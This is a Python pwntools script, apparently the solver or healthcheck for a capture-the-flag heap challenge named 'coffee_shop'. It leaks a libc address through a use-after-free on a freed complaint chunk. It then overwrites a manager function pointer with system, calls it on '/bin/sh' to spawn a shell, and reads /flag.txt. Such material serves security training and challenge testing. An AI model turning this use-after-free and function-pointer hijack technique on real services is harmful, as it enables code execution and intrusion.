#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

p = remote('127.0.0.1', 1337)
print(p.recvuntil('== proof-of-work: '))
if p.recvline().startswith(b'enabled'):
    handle_pow(p)

def sendchoice(choice: int, delim: str = '> '):
    p.sendlineafter(delim, str(choice))

def file_complaint(complaint: str, size: int = None) -> int:
    sendchoice(4)

    sendchoice(size if size else len(complaint) + 1, ": ")
    p.sendlineafter(": ", complaint)

    return int(p.recvline().split()[-1])

def revert_complaint(id_: int):
    sendchoice(5)
    sendchoice(id_, ": ")

def edit_complaint(id_: int, new_complaint: str):
    sendchoice(6)
    sendchoice(id_, ": ")
    p.sendlineafter(": ", new_complaint)

def view_complaint(id_: int):
    sendchoice(7)
    sendchoice(id_, ": ")

def manager_voucher():
    sendchoice(8)
    sendchoice(2)

def manager_discount(price: int):
    sendchoice(8)
    sendchoice(1)
    p.sendlineafter(": ", str(price))

context.binary = elf = ELF("/home/user/coffee_shop")
# libc = ELF("./libc-2.31.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


# Stage 1 - Get libc leak
# Allocate a chunk which won't go into tcachebin and end up in unsorted bin
a = file_complaint("A"*8, 0x410)
# A chunk after to avoid consolidation with top chunk
file_complaint("AVOID CONSOLITDATION")
# Free the chunk to put it into unsorted bin
revert_complaint(a)
# Get the libc leak
view_complaint(a)
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0
print(hex(libc.address))

# Stage 2 - Overwrite the function pointer of manager to system
# Allocate a chunk of same size as manager
b = file_complaint("B"*8, 0x10)
# Free the chunk
revert_complaint(b)
# Allocate manager to overlap with 'b' chunk
manager_voucher()
# Overwrite function pointer
edit_complaint(b, b'A'*8 + p64(libc.sym.system)[:7])
# Pass address of /bin/sh as first argument
manager_discount(next(libc.search(b'/bin/sh')))

p.sendline('cat /flag.txt')

data = p.recvline()

if b'idek{' in data and b'}' in data:
    exit(0)
exit(1)